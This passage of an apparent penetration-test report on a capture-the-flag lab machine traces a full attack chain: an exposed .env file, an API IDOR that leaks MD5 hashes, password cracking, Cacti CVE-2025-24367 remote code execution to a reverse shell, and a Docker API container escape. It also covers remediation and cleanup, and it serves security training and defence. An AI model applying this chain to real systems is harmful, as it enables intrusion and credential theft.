PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

Target identified as Windows Server 2025 running nginx web server with WinRM.

**1.2 Virtual Host Discovery**  
*[Source: gobuster.log]*

```text
cacti.monitorsfour.htb Status: 302 [Size: 0] [--> /cacti]
```

Cacti monitoring application discovered.

**1.3 Web Technology Fingerprinting**  
*[Source: whatweb.log]*

```text
PHP[8.3.27], nginx, Bootstrap, JQuery
```

---

#### Phase 2: Credential Discovery

**2.1 Environment File Exposure**  
*[Source: ffuf.log, curl.log]*

Discovered `/.env` file containing database credentials:
- `DB_USER=monitorsdbuser`
- `DB_PASS=f37p2j8f4t0r`

**2.2 API IDOR Exploitation**  
*[Source: curl.log]*

Accessed `/api/v1/user?token=0` returning all user records with MD5 password hashes.

**2.3 Password Hash Cracking**  
*[Source: hashcat.log]*

```text
56b32eb43e6f15395f6c46c1c9e1cd36:wonderful1
```

Administrator password cracked in 23 seconds.

---

#### Phase 3: Initial Access

**3.1 Cacti Authentication**  
*[Source: tasks.md]*

Credentials `marcus` / `wonderful1` successfully authenticated to Cacti.

**3.2 CVE-2025-24367 Exploitation**  
*[Source: scripts/exploit.py]*

Exploited graph template RCE to achieve reverse shell:

```bash
www-data@821fbd6a43fa:/var/www/html/cacti$
```

**3.3 User Flag Capture**  
*[Source: reverse_sh.log]*

```text
user flag: a3c1cc58144071a720ebeab984da076b
```

---

#### Phase 4: Container Escape and Privilege Escalation

**4.1 Environment Analysis**  
*[Source: reverse_sh.log – Expert Analysis]*

Container ID `821fbd6a43fa` indicated Docker environment.

**4.2 Internal Network Scanning**  
*[Source: reverse_sh.log]*

Discovered Docker API at `192.168.65.7:2375`.

**4.3 Malicious Container Deployment**  
*[Source: reverse_sh.log]*

Created container with host filesystem mount:

```json
{
  "Binds": ["/mnt/host/c:/mnt/host_root"]
}
```

**4.4 Root Flag Capture**  
*[Source: reverse_sh.log]*

```text
root flag: 872a2609a68c5c225af20026cd0c8f70
```

---

### Attack Chain Diagram

*[Source: Expert Generated]*

```
[Reconnaissance]
       │
       ▼
[.env Exposure] ──► Database Credentials
       │
       ▼
[API IDOR] ──► User Hashes (MD5)
       │
       ▼
[Hash Cracking] ──► Plaintext Password: wonderful1
       │
       ▼
[Cacti Login] ──► Authenticated Session
       │
       ▼
[CVE-2025-24367] ──► Reverse Shell (www-data)
       │
       ▼
[User Flag] ──► a3c1cc58144071a720ebeab984da076b
       │
       ▼
[Docker API Discovery] ──► 192.168.65.7:2375
       │
       ▼
[Container Escape] ──► Host Filesystem Access
       │
       ▼
[Root Flag] ──► 872a2609a68c5c225af20026cd0c8f70
```

---

## REMEDIATION SUMMARY

*[Source: Industry Best Practice / Expert Analysis]*

### SHORT TERM (0–30 Days)

| Priority | Finding | Action                                                       |
| -------- | ------- | ------------------------------------------------------------ |
| 1        | PT-005  | Disable unauthenticated Docker API; bind to localhost only   |
| 2        | PT-004  | Patch Cacti to version addressing CVE-2025-24367             |
| 3        | PT-001  | Block `.env` file access in nginx; rotate credentials        |
| 4        | PT-002  | Implement authorization on API endpoints                     |
| 5        | PT-003  | Force password reset; implement bcrypt hashing               |

### MEDIUM TERM (30–90 Days)

| Finding  | Action                                                       |
| -------- | ------------------------------------------------------------ |
| PT-005   | Implement Docker TLS authentication; network segmentation    |
| PT-001/2 | Store secrets in vault; implement proper secrets management  |
| PT-006/7 | Deploy security headers; configure secure cookie settings    |
| All      | Implement centralized logging and SIEM alerting              |

### LONG TERM (90+ Days)

| Focus Area          | Action                                                       |
| ------------------- | ------------------------------------------------------------ |
| Vulnerability Mgmt  | Regular vulnerability scanning and patching cadence          |
| Container Security  | Runtime security monitoring (Falco); image scanning          |
| Access Control      | Zero trust implementation; least privilege enforcement       |
| Security Testing    | Regular penetration testing; bug bounty program              |

---

## APPENDICES

### APPENDIX A – FINDING SEVERITIES

| Severity      | Definition                                                                 |
| ------------- | -------------------------------------------------------------------------- |
| Critical      | Immediate risk of compromise; requires emergency response                  |
| High          | Significant risk; should be addressed within 30 days                       |
| Medium        | Moderate risk; should be addressed within 90 days                          |
| Low           | Minor risk; address as part of regular maintenance                         |
| Informational | Best practice recommendation; no direct exploitation risk                  |

### APPENDIX B – EXPLOITED HOSTS

| Host                    | Method                              | Access Level    |
| ----------------------- | ----------------------------------- | --------------- |
| cacti.monitorsfour.htb  | CVE-2025-24367 RCE                  | www-data (user) |
| 192.168.65.7            | Docker API container escape         | root            |

### APPENDIX C – COMPROMISED USERS

| Username | Role         | Compromise Method       | Evidence              |
| -------- | ------------ | ----------------------- | --------------------- |
| marcus   | Super User   | MD5 hash cracked        | hashcat.log           |
| admin    | Super User   | Hash exposed (not used) | curl.log              |
| mwatson  | User         | Hash exposed            | curl.log              |
| janderson| User         | Hash exposed            | curl.log              |
| dthompson| User         | Hash exposed            | curl.log              |

### APPENDIX D – CHANGES/HOST CLEANUP

*[Source: Expert Analysis]*

| Change                           | Status   | Notes                              |
| -------------------------------- | -------- | ---------------------------------- |
| Reverse shell connection         | Closed   | Session terminated post-testing    |
| Malicious PHP files (Cacti)      | Unknown  | May persist; recommend cleanup     |
| Malicious container (pwned)      | Unknown  | May persist; recommend removal     |

**Recommended Cleanup Actions:**
1. Remove any `.php` files in `/var/www/html/cacti` matching random 5-character names
2. Remove Docker container named "pwned" via: `docker rm -f pwned`
3. Review Docker logs for unauthorized container activity
4. Rotate all exposed credentials

### APPENDIX E – PASSWORD REVIEW

*[Source: hashcat.log, curl.log – Executed Logs]*

| Finding                     | Status     | Recommendation                      |
| --------------------------- | ---------- | ----------------------------------- |
| Hash Algorithm              | MD5 (weak) | Migrate to bcrypt/Argon2id          |
| Salt Usage                  | None       | Implement unique salts per password |
| Cracked Password            | wonderful1 | Enforce complexity requirements     |
| Password in Top 10K List    | Yes        | Block common passwords              |

---

## REPORT METADATA

| Field                    | Value                                              |
| ------------------------ | -------------------------------------------------- |
| Report Generated         | 2026-01-15                                         |
| Classification           | Confidential                                       |
| Tools Used               | Nmap, Gobuster, Nikto, WhatWeb, FFUF, Dirb, AutoRecon, Hashcat, Netexec, WAFW00F, Custom Exploit |
| Log Sources Referenced   | nmap_init.nmap, nmap_vuln.nmap, gobuster.log, nikto.log, whatweb.log, ffuf.log, dirb.log, curl.log, hashcat.log, reverse_sh.log, autorecon.log, netexec.log, _full_tcp_nmap.txt, exploit.py |

---

*End of Report*
